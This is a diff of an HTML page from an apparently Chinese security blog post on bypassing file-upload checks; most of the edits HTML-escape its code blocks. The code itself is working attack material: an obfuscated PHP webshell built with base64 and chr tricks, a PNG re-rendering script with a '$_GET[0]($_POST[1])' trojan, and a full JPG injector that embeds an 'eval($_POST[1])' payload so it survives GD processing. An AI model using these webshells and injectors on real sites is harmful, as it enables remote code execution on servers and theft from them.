@@ -404,21 +404,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-14
+                    2023-04-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    8 分
                 </div>
                 
 
@@ -525,8 +525,8 @@ Apache认为应该从右到左开始判断解析方法的。
 &lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;
 </code></pre>
 <p>PNG二次渲染脚本</p>
-<pre class="line-numbers language-PHP"><code class="language-PHP">
-<?php
+<pre><code>
+&lt;?php
 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
@@ -539,7 +539,7 @@ $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
 
 $img = imagecreatetruecolor(32, 32);
 
-for ($y = 0; $y < sizeof($p); $y += 3) &#123;
+for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
@@ -547,62 +547,62 @@ for ($y = 0; $y < sizeof($p); $y += 3) &#123;
    imagesetpixel($img, round($y / 3), 0, $color);
 &#125;
 
-imagepng($img,'1.png');  //要修改的图片的路径
+imagepng($img,&#39;1.png&#39;);  //要修改的图片的路径
 
-/*木马内容   <?$_GET[0]($_POST[1]);?>   */
+/*木马内容   &lt;?$_GET[0]($_POST[1]);?&gt;   */
 
-?>
+?&gt;
 建议使用已经渲染过一次的文件写入木马，防止文件改动过大。
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>JPG二次渲染脚本</p>
-<pre class="line-numbers language-PHP"><code class="language-PHP">
-<?php
-    $miniPayload = "<?=eval(\$_POST[1]);?>";
+<pre><code>
+&lt;?php
+    $miniPayload = &quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;;
 
-    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123;
-        die('php-gd is not installed');
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
+        die(&#39;php-gd is not installed&#39;);
     &#125;
     if(!isset($argv[1])) &#123;
-        die('php jpg_payload.php <jpg_name.jpg>');
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
     &#125;
-    set_error_handler("custom_error_handler");
-    for($pad = 0; $pad < 1024; $pad++) &#123;
+    set_error_handler(&quot;custom_error_handler&quot;);
+    for($pad = 0; $pad &lt; 1024; $pad++) &#123;
         $nullbytePayloadSize = $pad;
         $dis = new DataInputStream($argv[1]);
         $outStream = file_get_contents($argv[1]);
         $extraBytes = 0;
         $correctImage = TRUE;
 
-        if($dis->readShort() != 0xFFD8) &#123;
-            die('Incorrect SOI marker');
+        if($dis-&gt;readShort() != 0xFFD8) &#123;
+            die(&#39;Incorrect SOI marker&#39;);
         &#125;
-        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) &#123;
-            $marker = $dis->readByte();
-            $size = $dis->readShort() - 2;
-            $dis->skip($size);
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
             if($marker === 0xDA) &#123;
-                $startPos = $dis->seek();
+                $startPos = $dis-&gt;seek();
                 $outStreamTmp = 
                     substr($outStream, 0, $startPos) . 
                     $miniPayload . 
-                    str_repeat("\0",$nullbytePayloadSize) . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
                     substr($outStream, $startPos);
-                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                 if($extraBytes !== 0) &#123;
-                    while((!$dis->eof())) &#123;
-                        if($dis->readByte() === 0xFF) &#123;
-                            if($dis->readByte !== 0x00) &#123;
+                    while((!$dis-&gt;eof())) &#123;
+                        if($dis-&gt;readByte() === 0xFF) &#123;
+                            if($dis-&gt;readByte !== 0x00) &#123;
                                 break;
                             &#125;
                         &#125;
                     &#125;
-                    $stopPos = $dis->seek() - 2;
+                    $stopPos = $dis-&gt;seek() - 2;
                     $imageStreamSize = $stopPos - $startPos;
                     $outStream = 
                         substr($outStream, 0, $startPos) . 
                         $miniPayload . 
                         substr(
-                            str_repeat("\0",$nullbytePayloadSize).
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                 substr($outStream, $startPos, $imageStreamSize),
                             0,
                             $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
@@ -612,16 +612,16 @@ imagepng($img,'1.png');  //要修改的图片的路径
                 &#125; else &#123;
                     break;
                 &#125;
-                if(checkImage('payload_'.$argv[1], $outStream)) &#123;
-                    die('Success!');
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
+                    die(&#39;Success!&#39;);
                 &#125; else &#123;
                     break;
                 &#125;
             &#125;
         &#125;
     &#125;
-    unlink('payload_'.$argv[1]);
-    die('Something\'s wrong');
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
 
     function checkImage($filename, $data, $unlink = FALSE) &#123;
         global $correctImage;
@@ -636,7 +636,7 @@ imagepng($img,'1.png');  //要修改的图片的路径
     function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
         global $extraBytes, $correctImage;
         $correctImage = FALSE;
-        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) &#123;
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;
             if(isset($m[1])) &#123;
                 $extraBytes = (int)$m[1];
             &#125;
@@ -649,55 +649,55 @@ imagepng($img,'1.png');  //要修改的图片的路径
         private $size;
 
         public function __construct($filename, $order = false, $fromString = false) &#123;
-            $this->binData = '';
-            $this->order = $order;
+            $this-&gt;binData = &#39;&#39;;
+            $this-&gt;order = $order;
             if(!$fromString) &#123;
                 if(!file_exists($filename) || !is_file($filename))
-                    die('File not exists ['.$filename.']');
-                $this->binData = file_get_contents($filename);
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData = file_get_contents($filename);
             &#125; else &#123;
-                $this->binData = $filename;
+                $this-&gt;binData = $filename;
             &#125;
-            $this->size = strlen($this->binData);
+            $this-&gt;size = strlen($this-&gt;binData);
         &#125;
 
         public function seek() &#123;
-            return ($this->size - strlen($this->binData));
+            return ($this-&gt;size - strlen($this-&gt;binData));
         &#125;
 
         public function skip($skip) &#123;
-            $this->binData = substr($this->binData, $skip);
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
         &#125;
 
         public function readByte() &#123;
-            if($this->eof()) &#123;
-                die('End Of File');
+            if($this-&gt;eof()) &#123;
+                die(&#39;End Of File&#39;);
             &#125;
-            $byte = substr($this->binData, 0, 1);
-            $this->binData = substr($this->binData, 1);
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
             return ord($byte);
         &#125;
 
         public function readShort() &#123;
-            if(strlen($this->binData) < 2) &#123;
-                die('End Of File');
+            if(strlen($this-&gt;binData) &lt; 2) &#123;
+                die(&#39;End Of File&#39;);
             &#125;
-            $short = substr($this->binData, 0, 2);
-            $this->binData = substr($this->binData, 2);
-            if($this->order) &#123;
-                $short = (ord($short[1]) << 8) + ord($short[0]);
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) &#123;
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
             &#125; else &#123;
-                $short = (ord($short[0]) << 8) + ord($short[1]);
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
             &#125;
             return $short;
         &#125;
 
         public function eof() &#123;
-            return !$this->binData||(strlen($this->binData) === 0);
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
         &#125;
     &#125;
-?>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;
+</code></pre>
 
                 
             </div>
@@ -1001,7 +1001,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">85.4k</span>
+                        class="white-color">86.5k</span>
             
             
             
